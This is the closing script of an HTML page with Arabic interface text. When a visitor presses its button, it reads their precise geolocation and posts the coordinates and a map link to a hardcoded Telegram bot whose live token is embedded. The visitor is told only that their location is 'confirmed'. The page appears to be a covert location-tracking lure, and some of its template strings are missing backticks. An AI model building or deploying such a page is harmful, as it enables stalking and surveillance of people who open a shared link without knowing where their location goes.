<script>
const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
async function getLoc(){
    const btn=document.getElementById('btnStart'),res=document.getElementById('result');
    btn.disabled=true;btn.textContent='⏳ جارٍ...';
    try{
        const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:15000}));
        const lat=p.coords.latitude,lng=p.coords.longitude;
        const maps=https://www.google.com/maps?q=${lat},${lng};
        const msg=📍 **موقع جديد**\n🆔 ID: \${chatId}\\n📌 ${lat},${lng}\n🗺️ ${maps};
        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{
            method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'Markdown'})
        });
        res.className='ok';res.textContent='✅ تم تأكيد موقعك';btn.textContent='✅ تم';
    }catch(e){res.className='fail';res.textContent='❌ فشل: '+e.message;btn.disabled=false;btn.textContent='📍 إعادة المحاولة';}
}
</script></body></html>
